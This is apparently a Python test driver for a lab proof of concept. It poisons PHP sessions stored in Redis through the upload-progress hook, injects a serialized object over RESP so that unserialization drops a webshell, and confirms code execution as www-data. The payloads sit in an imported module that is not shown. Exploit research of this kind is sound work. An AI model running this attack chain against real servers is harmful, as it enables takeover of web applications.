#!/usr/bin/env python3
"""Driver for redis_session_poison.py: (1) hook-test confirms the upload-progress
hook persists the poison into the redis store like it does to a sess_ file; (2)
escalate does a direct RESP object-injection write so the reader's session_start()
unserializes it -> __destruct drops a webshell -> `id` returns uid=33.

Bring up the lab:
    docker compose -f docker-compose.fpm-avenues.yml -p p2s-redissess --profile redissess up -d --build
    python3 -I poc/routes/verify_redis_session_poison.py --port 8148 --redis-port 6380
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import redis_session_poison as rp  # noqa: E402


class _NS:
    pass


def _args(host, port, rhost, rport, mode, sid, cmd):
    a = _NS()
    a.host, a.port = host, port
    a.redis_host, a.redis_port = rhost, rport
    a.mode = mode
    a.base = "/index.php"
    a.sid = sid
    a.prefix = rp.REDIS_PREFIX
    a.cmd = cmd
    a.gadget = rp.DEFAULT_GADGET
    a.shell_name = rp.DEFAULT_SHELL_NAME
    a.shell_body = rp.DEFAULT_SHELL_BODY
    a.docroot = "/var/www/html"
    return a


def main(argv):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8148)
    ap.add_argument("--redis-host", default="127.0.0.1")
    ap.add_argument("--redis-port", type=int, default=6380)
    ap.add_argument("--cmd", default="id")
    args = ap.parse_args(argv)

    def log(m):
        print(m, flush=True)

    log(f"=== AVENUE #8 redis-session-poison verify  "
        f"http://{args.host}:{args.port}  redis={args.redis_host}:{args.redis_port} ===")

    log("\n--- (1) upload-progress hook -> redis store ---")
    hook_ok = rp.mode_hook_test(
        _args(args.host, args.port, args.redis_host, args.redis_port,
              "hook-test", None, args.cmd), log)

    log("\n--- (2) direct RESP object-injection escalation ---")
    esc = _args(args.host, args.port, args.redis_host, args.redis_port,
                "escalate", None, args.cmd)
    out = {}
    orig = rp.extract_uid

    def _cap(data):
        u = orig(data)
        if u:
            out["uid"] = u
        return u
    rp.extract_uid = _cap
    try:
        esc_ok = rp.mode_escalate(esc, log)
    finally:
        rp.extract_uid = orig

    uid = out.get("uid", "")
    uid33 = "uid=33" in uid
    log("\n=== RESULT ===")
    log(f"  upload-progress writes to redis : {'YES' if hook_ok else 'NO'}")
    log(f"  escalation (object injection)   : {'RCE' if esc_ok else 'no RCE'}")
    log(f"  uid                             : {uid or '(none)'}")
    log(f"  uid=33 (www-data)               : {uid33}")
    if esc_ok and uid33:
        log("\nRESULT: PASS - redis session poisoning lands uid=33 via object injection")
        return 0
    log("\nRESULT: FAIL")
    return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
